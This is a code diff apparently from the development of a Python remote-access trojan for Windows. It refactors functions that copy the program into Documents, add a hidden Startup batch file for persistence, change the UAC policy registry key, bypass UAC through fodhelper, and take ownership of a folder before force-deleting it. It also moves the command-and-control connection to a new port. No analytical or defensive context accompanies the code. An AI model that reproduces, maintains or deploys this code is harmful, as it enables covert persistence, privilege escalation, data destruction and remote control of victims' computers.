@@ -53,12 +53,12 @@ def connect()->None:
     except TimeoutError:connect()
     except ConnectionRefusedError:connect()
 def CYS()->None:
-    copyfile(argv[0],(r"C:\Users\{}\Documents\\"+basename(argv[0])).format(environ["username"]))
-    with open(r"C:\Users\{}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\start.bat".format(environ["username"]), "w") as file:
+    copyfile(argv[0],(r"C:\Users\{}\Documents\\"+basename(argv[0])).format(environ.get("username")))
+    with open(r"C:\Users\{}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\start.bat".format(environ.get("username")), "w") as file:
         file.write("""@Echo off
 start C:\\Users\\{0}\\Documents\\{1}
-exit""".format(environ["username"], basename(argv[0])))
-    run("attrib +s +h +r C:\\Users\\"+environ["username"]+"\\Documents\\"+basename(argv[0]))
+exit""".format(environ.get("username"), basename(argv[0])))
+    run("attrib +s +h +r C:\\Users\\"+environ.get("username")+"\\Documents\\"+basename(argv[0]))
     run("attrib +s +h +r \"C:\\Users\\{}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\start.bat\"".format(environ.get("username")))
 def LUA_OFF()->None:
     key = OpenKeyEx(HKEY_LOCAL_MACHINE,r"SOFTWARE\Microsoft\Windows\CurrentVersion\\Policies\\System", 0, KEY_WRITE)
@@ -85,10 +85,10 @@ def fodhelper(target:str=argv[0])->None:
         call(f"run {target} {ms_reg} fodhelper.exe")
         process_is_exists(basename(target))
 def FDR(target:str)->None:
-    run(f"takeown /D Y /R /F {target}")
-    run("icacls {target} /T /C /grant {}:(F,MA)".format(environ["username"]))
-    run(f"rmdir /S /Q {target}")
-addr=("%s",8085)
+    run("takeown /D Y /R /F {}".format(target))
+    run("icacls {} /T /C /grant {}:(F,MA)".format(target,environ.get("username")))
+    run("rmdir /S /Q {}".format(target))
+addr=("%s",54213)
 connect()
 while True:
     try:
